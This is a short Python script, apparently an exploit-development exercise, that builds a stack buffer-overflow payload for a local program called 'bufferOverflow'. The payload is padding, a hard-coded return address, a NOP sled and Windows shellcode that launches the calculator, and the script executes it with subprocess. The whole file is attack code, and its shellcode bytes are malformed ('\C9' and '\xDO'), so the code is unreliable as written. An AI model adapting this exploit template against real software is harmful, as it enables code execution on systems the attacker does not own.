#!/usr/bin/python
#Testing after calculating offset(distance between variable and R.A) with Simple_Fuzzer.py
#Author: Pepitoex123

import subprocess

param = "bufferOverflow "
param += 30 * "A"
param += chr(0xa0) + chr(0xe1) + chr(0x57) + chr(0x75)
param += 30 * "\x90"

shellcode = "\x31\C9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xDO"
param += shellcode

subprocess.call(param)

